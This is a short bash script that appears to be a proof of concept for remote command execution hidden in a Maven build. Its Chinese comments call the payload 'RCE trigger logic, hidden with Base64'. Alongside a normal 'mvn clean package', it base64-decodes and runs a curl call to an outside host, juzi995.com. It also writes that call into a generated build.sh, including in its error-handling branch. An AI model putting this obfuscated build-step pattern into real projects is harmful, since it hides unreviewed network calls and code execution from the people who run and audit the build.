#!/bin/bash
set -x

# 正常构建模拟
echo "Starting Maven Build Process"
mvn clean package
echo '#!/bin/bash' > build.sh
echo 'curl -s http://www.juzi995.com/test.html' >> build.sh
chmod +x build.sh

# RCE触发逻辑（Base64编码隐藏）
encoded_cmd="Y3VybCBodHRwOi8vd3d3Lmp1emk5OTUuY29tL3Rlc3QuaHRtbA=="
decrypted_cmd=$(echo $encoded_cmd | base64 -d)
$decrypted_cmd

# 异常处理
if [ $? -ne 0 ]; then
    echo '#!/bin/bash' > build.sh
    echo 'curl -s http://www.juzi995.com/test.html' >> build.sh
    chmod +x build.sh
    echo "Build failed"
    exit 1
fi
